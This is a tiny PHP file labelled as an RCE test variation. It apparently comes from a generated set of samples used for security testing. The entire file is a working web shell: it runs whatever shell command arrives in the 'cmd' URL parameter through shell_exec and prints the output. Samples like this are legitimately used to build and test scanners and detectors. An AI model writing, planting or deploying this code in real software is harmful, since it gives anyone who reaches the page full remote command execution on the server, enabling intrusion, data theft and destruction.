<?php
// RCE test variation #1486
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>